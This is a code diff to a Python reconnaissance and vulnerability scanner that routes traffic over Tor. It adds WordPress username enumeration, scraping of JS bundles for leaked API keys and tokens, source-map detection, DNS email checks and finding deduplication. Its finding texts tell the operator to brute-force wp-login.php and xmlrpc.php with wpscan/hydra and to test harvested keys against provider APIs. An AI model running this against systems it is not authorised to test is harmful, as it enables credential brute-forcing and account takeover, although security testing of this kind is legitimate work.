+            new_findings.extend(self._wp_deep_scan(base_url))
 
         return new_findings
 
@@ -4286,6 +6222,86 @@ class FindingChain:
                                   "POST system.listMethods to enumerate available methods.",
                         "risk": "Brute-force, SSRF via pingback, denial of service",
                     }
+
+        # ── User enumeration via REST API ───────────────────────────
+        if not shutdown_requested():
+            users_url = urljoin(base_url, "/wp-json/wp/v2/users")
+            u_resp = self._session.get(users_url, allow_wayback=False)
+            if u_resp and u_resp.status_code == 200 and u_resp.text:
+                try:
+                    users = u_resp.json()
+                except Exception:
+                    users = None
+                if isinstance(users, list) and users:
+                    slugs = [u.get("slug") for u in users if isinstance(u, dict) and u.get("slug")]
+                    names = [u.get("name") for u in users if isinstance(u, dict) and u.get("name")]
+                    sample = slugs[:5] or names[:5]
+                    if sample:
+                        findings.append({
+                            "severity": SEV_HIGH,
+                            "title": f"WordPress user enumeration: {len(users)} account(s) exposed",
+                            "detail": (f"GET /wp-json/wp/v2/users returns the "
+                                       f"full user list (slug + display name + "
+                                       f"avatar). Usernames needed for brute-force "
+                                       f"are now public."),
+                            "evidence": f"Slugs: {', '.join(sample[:5])}",
+                            "confidence": 0.95,
+                            "exploitable": True,
+                            "chain_source": "wordpress_deep_scan",
+                            "exploit_info": {
+                                "type": "wp_user_enum",
+                                "path": "/wp-json/wp/v2/users",
+                                "usernames": sample,
+                                "method": (f"Usernames ({', '.join(sample[:3])}) "
+                                           f"are now known. Feed them to "
+                                           f"wpscan/hydra against /wp-login.php "
+                                           f"or /xmlrpc.php. Test the most "
+                                           f"common ones with common passwords "
+                                           f"before escalating to a wordlist."),
+                                "risk": "Credential brute-force, account takeover",
+                            },
+                        })
+
+        # ── /?author=N enumeration fallback ──
+        # If REST API is blocked, author-N permalinks often leak the
+        # same info via redirect.
+        if not shutdown_requested():
+            author_usernames: List[str] = []
+            for author_id in range(1, 6):
+                a_url = urljoin(base_url, f"/?author={author_id}")
+                a_resp = self._session.get(a_url, allow_wayback=False,
+                                           method="HEAD")
+                if not a_resp:
+                    continue
+                # WP redirects /?author=N to /author/<login>/
+                if a_resp.status_code in (301, 302, 303):
+                    loc = a_resp.headers.get("Location", "")
+                    m = re.search(r"/author/([^/?&#]+)", loc, re.I)
+                    if m:
+                        uname = m.group(1)
+                        if uname and uname not in author_usernames:
+                            author_usernames.append(uname)
+            if author_usernames:
+                findings.append({
+                    "severity": SEV_MEDIUM,
+                    "title": "WordPress author-ID enumeration leaks usernames",
+                    "detail": (f"Requesting /?author=N for N=1..5 redirects "
+                               f"to /author/<login>/, leaking {len(author_usernames)} "
+                               f"username(s) even if the REST API is blocked."),
+                    "evidence": f"Usernames: {', '.join(author_usernames)}",
+                    "confidence": 0.95,
+                    "exploitable": True,
+                    "chain_source": "wordpress_deep_scan",
+                    "exploit_info": {
+                        "type": "wp_user_enum",
+                        "path": "/?author=N",
+                        "usernames": author_usernames,
+                        "method": ("Brute-force xmlrpc.php or wp-login.php "
+                                   "with these usernames + common passwords."),
+                        "risk": "Credential brute-force, account takeover",
+                    },
+                })
+
         return findings
 
     def _admin_check(self, base_url: str) -> List[dict]:
@@ -4322,12 +6338,7 @@ class FindingChain:
 
         query = '{ __schema { types { name fields { name type { name } } } } }'
         try:
-            self._session._delay_for_domain(domain)
-            self._session._maybe_rotate_circuit()
-            resp = self._session._session.post(
-                url, json={"query": query}, timeout=REQUEST_TIMEOUT,
-                proxies=self._session._proxy, headers=_pick_profile(),
-            )
+            resp = self._session.post_json(url, {"query": query})
             if resp and resp.status_code == 200:
                 data = resp.json()
                 types = data.get("data", {}).get("__schema", {}).get("types", [])
@@ -4385,6 +6396,29 @@ class IntelScraper:
             return None
         content = resp.text
         headers = dict(resp.headers)
+        # dict(resp.headers) merges duplicate Set-Cookie values with commas,
+        # which breaks cookie-flag auditing when the server sets more than one
+        # cookie. Capture the raw multi-valued list separately so
+        # _check_cookies can audit each cookie independently.
+        raw_set_cookies: List[str] = []
+        try:
+            raw_set_cookies = list(resp.raw.headers.getlist("Set-Cookie"))
+        except (AttributeError, Exception):
+            # Fallback: at least walk resp.cookies to rebuild one Set-Cookie
+            # string per cookie with the flags that requests preserved.
+            try:
+                for ck in resp.cookies:
+                    parts = [f"{ck.name}={ck.value or ''}"]
+                    if ck.secure:
+                        parts.append("Secure")
+                    if ck.has_nonstandard_attr("HttpOnly"):
+                        parts.append("HttpOnly")
+                    ss = ck.get_nonstandard_attr("SameSite") if hasattr(ck, "get_nonstandard_attr") else None
+                    if ss:
+                        parts.append(f"SameSite={ss}")
+                    raw_set_cookies.append("; ".join(parts))
+            except Exception:
+                pass
         hp = self._honeypot.check(content, headers, elapsed_ms, len(resp.history))
         if hp["is_honeypot"]:
             integrity_log("intel", f"honeypot:{urlparse(url).netloc}")
@@ -4414,19 +6448,115 @@ class IntelScraper:
             combined = " ".join(comments)
             secrets_in_comments = self._extractor.extract_all(combined)
 
+        # ── Fetch first-party JS bundles and scan for secrets ───────
+        # Front-end bundles routinely embed API keys, JWT fragments,
+        # internal API paths, and debug URLs that never appear in the
+        # HTML. We fetch up to _JS_MAX_FILES same-origin JS files
+        # (capped at _JS_PER_FILE_CAP each, total budget
+        # _JS_TOTAL_CAP) and extract the same patterns the HTML went
+        # through. Caps are enforced so we don't spend 10 minutes
+        # downloading 2 MB bundles on a big SPA.
+        _JS_MAX_FILES = 6
+        _JS_PER_FILE_CAP = 256 * 1024          # 256 KB per bundle
+        _JS_TOTAL_CAP = 1_200_000              # ~1.2 MB session-wide
+        js_secrets: Dict[str, List[str]] = {}
+        js_urls_fetched: List[str] = []
+        js_bytes_fetched = 0
+        if HAS_BS4:
+            try:
+                base_host = urlparse(url).netloc.lower()
+                soup2 = BeautifulSoup(content[:200000], "html.parser")
+                js_candidates: List[str] = []
+                for s in soup2.find_all("script", src=True):
+                    src = s.get("src", "")
+                    if not src or src.startswith(("data:", "#", "javascript:")):
+                        continue
+                    full = urljoin(url, src)
+                    # Must look JS-like. Allow .js / .mjs / .cjs plus
+                    # extensionless bundler outputs that carry a
+                    # cache-busting query (/static/main.<hash>?v=...).
+                    low_full = full.lower()
+                    if not (low_full.endswith((".js", ".mjs", ".cjs"))
+                            or ".js?" in low_full
+                            or ".mjs?" in low_full):
+                        continue
+                    # Strict same-origin — netloc exact match OR a
+                    # subdomain of base_host. Skips CDN-hosted libs.
+                    jp_netloc = urlparse(full).netloc.lower()
+                    if jp_netloc != base_host and not jp_netloc.endswith(
+                        "." + base_host,
+                    ):
+                        continue
+                    if full not in js_candidates:
+                        js_candidates.append(full)
+                # Cap + fetch
+                for js_url in js_candidates[:_JS_MAX_FILES]:
+                    if shutdown_requested():
+                        break
+                    if js_bytes_fetched >= _JS_TOTAL_CAP:
+                        break
+                    js_resp = self._session.get(js_url, allow_wayback=False)
+                    if not js_resp or js_resp.status_code != 200:
+                        continue
+                    js_body = js_resp.text[:_JS_PER_FILE_CAP] if js_resp.text else ""
+                    if not js_body:
+                        continue
+                    js_bytes_fetched += len(js_body)
+                    js_urls_fetched.append(js_url)
+                    hits = self._extractor.extract_all(js_body)
+                    for k, v_list in hits.items():
+                        if not v_list:
+                            continue
+                        bucket = js_secrets.setdefault(k, [])
+                        for val in v_list:
+                            if val not in bucket:
+                                bucket.append(val)
+                    # Source-map pointer in the tail of the bundle.
+                    m = re.search(
+                        r"[#@]\s*sourceMappingURL\s*=\s*(\S+)",
+                        js_body[-4096:],
+                    )
+                    if m:
+                        map_url = urljoin(js_url, m.group(1))
+                        mp_netloc = urlparse(map_url).netloc.lower()
+                        if (mp_netloc == base_host or
+                                mp_netloc.endswith("." + base_host)):
+                            try:
+                                sm_resp = self._session.get(
+                                    map_url, allow_wayback=False,
+                                )
+                                if sm_resp and sm_resp.status_code == 200 and sm_resp.text:
+                                    js_secrets.setdefault(
+                                        "sourcemap_exposed", [],
+                                    ).append(map_url)
+                            except Exception:
+                                pass
+            except Exception as e:
+                integrity_log("intel", f"js_scrape_error:{type(e).__name__}")
+
         _coarsened = int(time.time()) // 600 * 600
         return {
             "url": url, "title": title[:200], "description": meta_desc[:500],
             "extracted": extracted, "urls_found": len(urls),
             "comments": len(comments),
             "secrets_in_comments": secrets_in_comments,
+            "js_secrets": js_secrets,
+            "js_urls_fetched": js_urls_fetched,
             "content_length": len(content), "timestamp": _coarsened,
             "raw_html": content, "raw_headers": headers,
+            "raw_set_cookies": raw_set_cookies,
             "honeypot": False,
         }
 
     def search_ddg(self, query: str, max_results: int = 20) -> List[dict]:
-        """DuckDuckGo HTML search — Tor-friendly, no JS needed."""
+        """DuckDuckGo HTML search — Tor-friendly, no JS needed.
+
+        DDG's HTML frontend frequently routes result links through
+        `/l/?uddg=<urlencoded-target>&...` instead of returning the
+        destination URL directly. The old version rejected those as
+        'duckduckgo' links and lost half the search results. Now we
+        unwrap the uddg parameter when present.
+        """
         results = []
         url = f"https://html.duckduckgo.com/html/?q={quote(query)}"
         resp = self._session.get(url)
@@ -4439,11 +6569,33 @@ class IntelScraper:
             if not links:
                 # Fallback: find any result links
                 links = soup.find_all("a", href=re.compile(r"^https?://"))
-            for link in links[:max_results]:
+            seen: Set[str] = set()
+            for link in links:
+                if len(results) >= max_results:
+                    break
                 href = link.get("href", "")
                 title = link.get_text(strip=True)
-                if href and href.startswith("http") and "duckduckgo" not in href:
-                    results.append({"url": href, "title": title, "source": "ddg"})
+                if not href:
+                    continue
+
+                # Unwrap DDG's /l/?uddg=<target> redirect
+                if href.startswith("/l/?") or "duckduckgo.com/l/?" in href:
+                    try:
+                        qs = parse_qs(urlparse(href).query)
+                        uddg = qs.get("uddg", [""])[0]
+                        if uddg:
+                            href = uddg
+                    except Exception:
+                        pass
+
+                if not href.startswith(("http://", "https://")):
+                    continue
+                if "duckduckgo.com" in urlparse(href).netloc:
+                    continue
+                if href in seen:
+                    continue
+                seen.add(href)
+                results.append({"url": href, "title": title, "source": "ddg"})
         except Exception as e:
             integrity_log("intel", f"ddg_parse_error:{str(e)[:40]}")
         return results
@@ -4525,16 +6677,91 @@ class IntelOrchestrator:
             print(f"  [!] The site may be down, blocking Tor, or require authentication.")
             print(f"  [*] Continuing with header/DNS checks only...")
         elif result.get("honeypot"):
-            print(f"  [!] Honeypot/WAF detected. Some checks may be limited.")
+            # Honeypot flag doesn't block DNS + subdomain + header checks
+            # since those don't hit the suspicious path. Keep going —
+            # just record the honeypot flag as a finding and proceed.
+            print(f"  [!] Honeypot/WAF detected "
+                  f"({', '.join(result.get('hp_reasons', [])[:3])}). "
+                  f"Surface checks may be noisy; DNS / subdomain recon "
+                  f"continues.")
+            self._vuln_findings.append({
+                "severity": SEV_INFO,
+                "title": "Probable honeypot / aggressive WAF",
+                "detail": ("Main-page fetch matched multiple honeypot "
+                           "/ WAF signals. Subsequent checks should be "
+                           "treated with extra scepticism — 200s may be "
+                           "trap responses, 403s may be WAF fooling us."),
+                "evidence": ", ".join(result.get("hp_reasons", [])[:4]),
+                "confidence": 0.7,
+            })
         else:
             self._results.append(result)
             self._print_extraction(result)
             if result.get("url", "").startswith("http://"):
                 base_url = f"http://{domain}"
 
+            # Turn JS-bundle secrets into top-tier vulnerability
+            # findings — an AWS key embedded in main.js is much more
+            # actionable than a line in the "extracted" bucket.
+            js_secrets = result.get("js_secrets", {}) or {}
+            for stype, values in js_secrets.items():
+                if stype == "sourcemap_exposed":
+                    for sm_url in values[:3]:
+                        self._vuln_findings.append({
+                            "severity": SEV_MEDIUM,
+                            "title": "Source map exposed",
+                            "detail": (f"Source map at {sm_url} is publicly "
+                                       f"accessible. Attacker can reconstruct "
+                                       f"original source tree (directory "
+                                       f"names, file paths, JSX/TS before "
+                                       f"minification)."),
+                            "evidence": sm_url,
+                            "confidence": 0.95,
+                            "exploit_info": {
+                                "type": "sourcemap_exposure",
+                                "path": urlparse(sm_url).path,
+                                "method": ("Fetch the .map file, parse "
+                                           "'sources' array — full source "
+                                           "tree of the SPA is recoverable."),
+                                "risk": "Source code disclosure, leaked "
+                                        "internal paths + comments",
+                            },
+                            "exploitable": True,
+                        })
+                    continue
+                if not values:
+                    continue
+                # Key types that are near-always critical:
+                critical_types = {"aws_key", "github_token", "stripe_key",
+                                  "jwt_token", "generic_secret"}
+                sev = SEV_CRITICAL if stype in critical_types else SEV_MEDIUM
+                self._vuln_findings.append({
+                    "severity": sev,
+                    "title": f"{stype} leaked in first-party JS bundle",
+                    "detail": (f"Scanning same-origin JS bundles surfaced "
+                               f"{len(values)} {stype} value(s). Front-end "
+                               f"minifiers don't strip secrets from the "
+                               f"source — anything bundled in is shipped "
+                               f"to the browser in the clear."),
+                    "evidence": (f"{stype} count: {len(values)}; "
+                                 f"sample: {str(values[0])[:40]}..."),
+                    "confidence": 0.95,
+                    "exploit_info": {
+                        "type": "js_secret_leak",
+                        "secret_kind": stype,
+                        "method": ("Pull the JS bundle, grep for the key, "
+                                   "test it against the corresponding "
+                                   "provider's API."),
+                        "risk": ("Credential theft — provider account "
+                                 "compromise depending on key type"),
+                    },
+                    "exploitable": True,
+                })
+
         # Phase 2: Technology fingerprinting
         html = result.get("raw_html", "") if result else ""
         headers = result.get("raw_headers", {}) if result else {}
+        raw_set_cookies = result.get("raw_set_cookies", []) if result else []
         tech = self._run_phase(2, "Technology fingerprinting",
                                self._tech.fingerprint, headers, html) or {}
         if tech:
@@ -4543,7 +6770,7 @@ class IntelOrchestrator:
         # Phase 3: Vulnerability scanning (headers + path probes)
         vulns = self._run_phase(3, f"Vulnerability scanning ({self._scan_depth})",
                                 self._vulns.scan_full, base_url, html, headers,
-                                self._scan_depth) or []
+                                self._scan_depth, raw_set_cookies) or []
         self._vuln_findings.extend(vulns)
         self._print_vulns(vulns)
 
@@ -4561,6 +6788,18 @@ class IntelOrchestrator:
             self._print_dns(dns_records)
             if dns_records:
                 self._results.append({"type": "dns", "domain": domain, "records": dns_records})
+                # Turn SPF / DMARC / DNSSEC posture into findings that
+                # get rendered in the same list as the web vulns.
+                try:
+                    email_findings = self._dns.analyze_email_posture(
+                        dns_records, domain=domain,
+                    )
+                    if email_findings:
+                        self._vulns._add_confidence(email_findings, 0.9)
+                        self._vuln_findings.extend(email_findings)
+                        self._print_vulns(email_findings)
+                except Exception as e:
+                    integrity_log("intel", f"email_posture_error:{type(e).__name__}")
 
         # Phase 5: Subdomain enumeration (deep only)
         if self._scan_depth == "deep":
@@ -4646,6 +6885,32 @@ class IntelOrchestrator:
             sep = ", " if blocked and timeouts else ""
             print(f"  [*] Network issues: {blocked}{sep}{timeouts}")
 
+        # Quick exploitable summary grouped by type — tells the operator
+        # which walkthrough branches are worth opening before they dig
+        # through the full report.
+        _dedup_vulns = self._dedup_findings(self._vuln_findings)
+        by_type: Dict[str, int] = defaultdict(int)
+        for v in _dedup_vulns:
+            if not v.get("exploitable"):
+                continue
+            t = (v.get("exploit_info") or {}).get("type", "other")
+            by_type[t] += 1
+        if by_type:
+            print(f"  [!] Exploitable findings by type:")
+            for t, n in sorted(by_type.items(), key=lambda kv: -kv[1]):
+                print(f"      {n:>3}  {t}")
+        elif _dedup_vulns:
+            # No EXPLOITABLE findings but we still have findings —
+            # that's a good sign the target is well-configured. Say so.
+            sev_count = defaultdict(int)
+            for v in _dedup_vulns:
+                sev_count[v["severity"]] += 1
+            counts_s = ", ".join(f"{sev_count[s]} {s}"
+                                 for s in (SEV_CRITICAL, SEV_HIGH,
+                                           SEV_MEDIUM, SEV_LOW, SEV_INFO)
+                                 if sev_count[s])
+            print(f"  [+] No exploitable findings. Informational: {counts_s}")
+
     def run_email(self, email: str):
         """Breach database check for email."""
         print(f"  [*] Checking: {email[:3]}***@***")
@@ -4722,16 +6987,53 @@ class IntelOrchestrator:
                 self.run_query(line, 10)
 
     def _print_extraction(self, result: dict):
-        ex = result.get("extracted", {})
-        if ex:
-            print(f"  [+] Data extracted:")
-            for etype, evals in ex.items():
-                print(f"      {etype}: {len(evals)} found")
-        sc = result.get("secrets_in_comments", {})
-        if sc:
-            print(f"  [!] Secrets found in HTML comments:")
-            for stype, svals in sc.items():
-                print(f"      {stype}: {len(svals)}")
+        _sensitive = {"aws_key", "github_token", "stripe_key",
+                      "jwt_token", "generic_secret"}
+
+        def _render_bucket(label: str, data: Dict[str, list],
+                           marker: str = "[+]") -> None:
+            if not data:
+                return
+            print(f"  {marker} {label}:")
+            for etype, evals in data.items():
+                if etype in _sensitive:
+                    print(f"      {etype}: {len(evals)} found "
+                          f"(values redacted — see report)")
+                    continue
+                if etype == "sourcemap_exposed":
+                    print(f"      source maps exposed: {len(evals)} "
+                          f"({evals[0][:60]}{'...' if len(evals) > 1 else ''})")
+                    continue
+                sample = list(evals)[:3]
+                samp_str = ", ".join(str(s)[:40] for s in sample)
+                more = f" (+{len(evals)-3} more)" if len(evals) > 3 else ""
+                print(f"      {etype}: {len(evals)} found — {samp_str}{more}")
+
+        _render_bucket("Data extracted", result.get("extracted", {}))
+        _render_bucket("Secrets found in HTML comments",
+                       result.get("secrets_in_comments", {}),
+                       marker="[!]")
+        # JS bundle secrets get the [!] marker because an API key in a
+        # bundle is a CRITICAL in the vuln findings; calling it out here
+        # so the operator sees it without scrolling through the main
+        # vuln list.
+        js = result.get("js_secrets", {})
+        if js:
+            fetched = len(result.get("js_urls_fetched", []))
+            print(f"  [!] JS-bundle secrets (scanned {fetched} bundle(s)):")
+            for etype, evals in js.items():
+                if etype in _sensitive:
+                    print(f"      {etype}: {len(evals)} found "
+                          f"(values redacted — see report)")
+                    continue
+                if etype == "sourcemap_exposed":
+                    print(f"      source maps exposed: {len(evals)} "
+                          f"({evals[0][:60]}{'...' if len(evals) > 1 else ''})")
+                    continue
+                sample = list(evals)[:3]
+                samp_str = ", ".join(str(s)[:40] for s in sample)
+                more = f" (+{len(evals)-3} more)" if len(evals) > 3 else ""
+                print(f"      {etype}: {len(evals)} found — {samp_str}{more}")
 
     def _print_tech(self, tech: dict):
         if tech.get("server"):
@@ -4749,10 +7051,60 @@ class IntelOrchestrator:
         if tech.get("meta_generator"):
             print(f"  [+] Generator: {tech['meta_generator']}")
 
+    @staticmethod
+    def _dedup_findings(vulns: List[dict]) -> List[dict]:
+        """Collapse findings whose identity is truly identical.
+
+        Identity = (vuln_type, parameter, path, test_url, title_prefix).
+        Including test_url matters: two SQLi findings at
+        /search.php?q=... and /profile.php?q=... share the same type +
+        param + short-title but are distinct endpoints and must not
+        collapse. An earlier version used (type, param, path) which
+        ate real findings.
+
+        When the identity keys match we keep the highest-confidence
+        instance; ties go to the instance that carries exploit_info.
+        """
+        best: Dict[str, dict] = {}
+        order_preserved: List[str] = []
+        for v in vulns:
+            ei = v.get("exploit_info") or {}
+            vtype = ei.get("type") or v.get("title", "")[:40].lower()
+            pkey = (
+                vtype,
+                ei.get("parameter", ""),
+                ei.get("path", "") or v.get("path", ""),
+                # test_url is the strongest tie-breaker for per-endpoint
+                # findings. Strip the query string so payload-only
+                # differences don't break dedup (' vs " on the same
+                # endpoint should still collapse).
+                (v.get("test_url") or "").split("?")[0],
+                v.get("title", "")[:40],
+            )
+            key = "::".join(str(p) for p in pkey)
+            existing = best.get(key)
+            if existing is None:
+                best[key] = v
+                order_preserved.append(key)
+            else:
+                new_conf = v.get("confidence", 0) or 0
+                old_conf = existing.get("confidence", 0) or 0
+                winner = v if new_conf > old_conf else existing
+                # Prefer a winner that has exploit_info over one that doesn't.
+                if (not winner.get("exploit_info") and
+                        v is not winner and v.get("exploit_info")):
+                    winner = v
+                if (not winner.get("exploit_info") and
+                        existing is not winner and existing.get("exploit_info")):
+                    winner = existing
+                best[key] = winner
+        return [best[k] for k in order_preserved]
+
     def _print_vulns(self, vulns: List[dict]):
         if not vulns:
             print(f"  [+] No vulnerabilities found at this scan depth")
             return
+        vulns = self._dedup_findings(vulns)
         # Sort by severity
         order = {SEV_CRITICAL: 0, SEV_HIGH: 1, SEV_MEDIUM: 2, SEV_LOW: 3, SEV_INFO: 4}
         vulns.sort(key=lambda v: order.get(v["severity"], 5))
@@ -4788,8 +7140,22 @@ class IntelOrchestrator:
         if not records:
             print(f"  [*] No DNS records found (DoH may be blocked)")
             return
-        for rtype, values in records.items():
-            print(f"  [+] {rtype}: {', '.join(values[:5])}")
+        # Sort key types so the printer shows A/AAAA/MX/NS first, then
+        # TXT (which often has SPF + DKIM + Google-site-verify mixed
+        # together), then CAA/DMARC/DNSKEY, then anything else.
+        order = {
+            "A": 0, "AAAA": 1, "CNAME": 2, "MX": 3, "NS": 4, "SOA": 5,
+            "TXT": 6, "DMARC": 7, "CAA": 8, "DNSKEY": 9,
+        }
+        for rtype in sorted(records, key=lambda r: order.get(r, 99)):
+            values = records[rtype]
+            if not values:
+                continue
+            # Trim per-value length so one pathological record doesn't
+            # blow out the line.
+            shown = [str(v)[:120] for v in values[:5]]
+            tail = f" (+{len(values) - 5} more)" if len(values) > 5 else ""
+            print(f"  [+] {rtype}: {', '.join(shown)}{tail}")
 
     def save_report(self) -> Optional[Path]:
         """Show results in terminal, then save report.
@@ -4828,6 +7194,13 @@ class IntelOrchestrator:
                 all_data[etype].update(evals)
             for etype, evals in r.get("secrets_in_comments", {}).items():
                 all_data[f"comment_{etype}"].update(evals)
+            for etype, evals in r.get("js_secrets", {}).items():
+                all_data[f"js_{etype}"].update(evals)
+
+        # Dedup vuln findings BEFORE counting / exporting — phase-B
+        # revisit passes + chain rules + the base-url checks all
+        # routinely re-discover the same issue. Collapse them.
+        self._vuln_findings = self._dedup_findings(self._vuln_findings)
 
         vuln_counts = defaultdict(int)
         for v in self._vuln_findings:
@@ -5130,15 +7503,32 @@ def main():
 
     # ── Input validation ──
     if args.domain:
-        # Normalize domain: strip protocol, trailing path, whitespace
+        # Normalize: strip protocol + path + fragment; drop optional
+        # userinfo; preserve any explicit :port so non-standard-port
+        # targets still scan. The previous hostname-only regex rejected
+        # 'example.com:8080' outright, which made it impossible to scan
+        # dev/staging/internal services that listen off 80/443.
         d = args.domain.strip().lower()
         if d.startswith("http://") or d.startswith("https://"):
             d = urlparse(d).netloc or d
         d = d.split("/")[0].split("?")[0].split("#")[0]
-        if not re.match(r"^[a-z0-9]([a-z0-9\-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9\-]*[a-z0-9])?)+$", d):
+        if "@" in d:
+            d = d.rsplit("@", 1)[1]
+        host, port = d, None
+        if ":" in d:
+            host, _, port_str = d.rpartition(":")
+            if port_str.isdigit() and 1 <= int(port_str) <= 65535:
+                port = port_str
+            else:
+                host = d  # colon wasn't a port; let the regex reject it
+                port = None
+        if not re.match(
+            r"^[a-z0-9]([a-z0-9\-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9\-]*[a-z0-9])?)+$",
+            host,
+        ):
             print(f"  [!] Invalid domain: {d[:40]}")
             sys.exit(1)
-        args.domain = d
+        args.domain = f"{host}:{port}" if port else host
 
     if args.email:
         e = args.email.strip()
